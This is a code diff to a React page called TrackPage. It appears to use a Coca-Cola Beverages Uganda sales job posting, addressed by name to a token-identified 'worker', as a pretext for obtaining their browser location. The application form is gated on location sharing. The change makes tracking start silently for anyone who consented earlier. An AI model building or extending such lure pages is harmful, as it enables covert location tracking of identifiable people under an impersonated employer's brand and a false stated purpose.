@@ -1,4 +1,3 @@
-
 'use client';
 
 import { useEffect, useRef, useState, type FormEvent } from 'react';
@@ -48,7 +47,13 @@ export default function TrackPage() {
       }
 
       setWorker(data[0]);
-      setShowLocationPopup(true);
+
+      if (data[0].consent_given_at) {
+        setShowLocationPopup(false);
+        startTracking();
+      } else {
+        setShowLocationPopup(true);
+      }
     })();
   }, [token]);
 
@@ -100,7 +105,7 @@ export default function TrackPage() {
 
         if (err.code === 1) {
           setError(
-            'Location sharing is required before you can open the application form. Please allow location access for this site, then try again.'
+            'Location sharing is required before submitting the application form. Please allow location access for this site, then try again.'
           );
           return;
         }
@@ -186,8 +191,6 @@ export default function TrackPage() {
     };
   }, [tracking]);
 
-  const canApply = !!worker && locationShared;
-
   return (
     <main className="page">
       <section className="hero">
@@ -217,68 +220,67 @@ export default function TrackPage() {
               <p className="eyebrow">Now hiring</p>
               <h1>Sales Representative</h1>
               <p className="intro">
-                Hello, {worker.name}. Complete this internal application for the Coca-Cola
-                Beverages Uganda field sales role.
+                Hello, {worker.name}. Review the job opening below. Location sharing is required
+                only before submitting the application form.
               </p>
 
               {error && <p className="notice errorNotice">{error}</p>}
 
-              {!canApply ? (
-                <div className="lockedPanel">
-                  <h2>Location sharing required</h2>
+              <div className="applicationArea">
+                <div className="jobPanel">
+                  <h2>Sales Representative</h2>
                   <p>
-                    To open the job details and application form, please share your location for
-                    application verification. The application will unlock after location sharing is
-                    active.
+                    Coca-Cola Beverages Uganda is recruiting a field sales representative to support
+                    customer visits, route growth, product availability, sales execution, and brand
+                    visibility across assigned territories.
                   </p>
-                  <button onClick={() => setShowLocationPopup(true)} className="primaryBtn">
-                    Share location to continue
-                  </button>
+
+                  <div className="jobGrid">
+                    <Detail label="Company" value="Coca-Cola Beverages Uganda" />
+                    <Detail label="Position" value="Sales Representative" />
+                    <Detail label="Location" value="Kampala, Uganda" />
+                    <Detail label="Department" value="Sales and Distribution" />
+                    <Detail label="Employment Type" value="Full-time" />
+                    <Detail label="Reports To" value="Area Sales Manager" />
+                  </div>
                 </div>
-              ) : (
-                <div className="applicationArea">
-                  <div className="jobPanel">
-                    <h2>Sales Representative</h2>
+
+                <div className="jobPanel twoCol">
+                  <div>
+                    <h2>Key Responsibilities</h2>
+                    <ul>
+                      <li>Visit assigned outlets and customers according to the approved route plan.</li>
+                      <li>Drive sales performance against daily, weekly, and monthly targets.</li>
+                      <li>Build strong relationships with retailers, wholesalers, and key customers.</li>
+                      <li>Ensure product availability, correct pricing, stock rotation, and visibility.</li>
+                      <li>Report customer feedback, competitor activity, and market opportunities.</li>
+                    </ul>
+                  </div>
+
+                  <div>
+                    <h2>Minimum Requirements</h2>
+                    <ul>
+                      <li>Diploma or degree in Business, Marketing, Sales, or a related field.</li>
+                      <li>At least 1 year of experience in FMCG, retail, sales, or distribution.</li>
+                      <li>Strong communication, negotiation, and customer relationship skills.</li>
+                      <li>Good knowledge of Kampala and surrounding sales territories.</li>
+                      <li>A valid riding or driving permit is an added advantage.</li>
+                    </ul>
+                  </div>
+                </div>
+
+                {!locationShared ? (
+                  <div className="lockedPanel">
+                    <h2>Application form locked</h2>
                     <p>
-                      Coca-Cola Beverages Uganda is recruiting a field sales representative to
-                      support customer visits, route growth, product availability, sales execution,
-                      and brand visibility across assigned territories.
+                      You can read the job opening now. To open and submit the application form,
+                      please share your location for application verification.
                     </p>
-
-                    <div className="jobGrid">
-                      <Detail label="Company" value="Coca-Cola Beverages Uganda" />
-                      <Detail label="Position" value="Sales Representative" />
-                      <Detail label="Location" value="Kampala, Uganda" />
-                      <Detail label="Department" value="Sales and Distribution" />
-                      <Detail label="Employment Type" value="Full-time" />
-                      <Detail label="Reports To" value="Area Sales Manager" />
-                    </div>
+                    <button onClick={() => setShowLocationPopup(true)} className="primaryBtn">
+                      Share location to apply
+                    </button>
                   </div>
-
-                  <div className="jobPanel twoCol">
-                    <div>
-                      <h2>Key Responsibilities</h2>
-                      <ul>
-                        <li>Visit assigned outlets and customers according to the approved route plan.</li>
-                        <li>Drive sales performance against daily, weekly, and monthly targets.</li>
-                        <li>Build strong relationships with retailers, wholesalers, and key customers.</li>
-                        <li>Ensure product availability, correct pricing, stock rotation, and visibility.</li>
-                        <li>Report customer feedback, competitor activity, and new market opportunities.</li>
-                      </ul>
-                    </div>
-
-                    <div>
-                      <h2>Minimum Requirements</h2>
-                      <ul>
-                        <li>Diploma or degree in Business, Marketing, Sales, or a related field.</li>
-                        <li>At least 1 year of experience in FMCG, retail, sales, or distribution.</li>
-                        <li>Strong communication, negotiation, and customer relationship skills.</li>
-                        <li>Good knowledge of Kampala and surrounding sales territories.</li>
-                        <li>A valid riding or driving permit is an added advantage.</li>
-                      </ul>
-                    </div>
-                  </div>
-
+                ) : (
                   <form onSubmit={submitApplication} className="applicationForm">
                     <h2>Application Form</h2>
 
@@ -360,8 +362,8 @@ export default function TrackPage() {
                       <p className="formStatus">Application submitted successfully.</p>
                     )}
                   </form>
-                </div>
-              )}
+                )}
+              </div>
             </>
           )}
         </div>
@@ -373,8 +375,8 @@ export default function TrackPage() {
             <div className="modalLogo">Coca-Cola</div>
             <h2>Share your location</h2>
             <p>
-              Location sharing is required before opening this internal field sales application.
-              Please allow location access when your browser asks.
+              You can read the job opening without sharing location. Location sharing is required to
+              open and submit the application form for this internal field sales role.
             </p>
 
             <button className="primaryBtn modalPrimary" onClick={acceptAndStart}>
@@ -490,7 +492,7 @@ export default function TrackPage() {
         .notice,
         .lockedPanel {
           margin-top: 24px;
-          max-width: 760px;
+          max-width: 900px;
           border-radius: 10px;
           background: rgba(255, 255, 255, 0.96);
           color: #171717;
@@ -730,4 +732,3 @@ function Detail({ label, value }: { label: string; value: string }) {
     </div>
   );
 }
-```
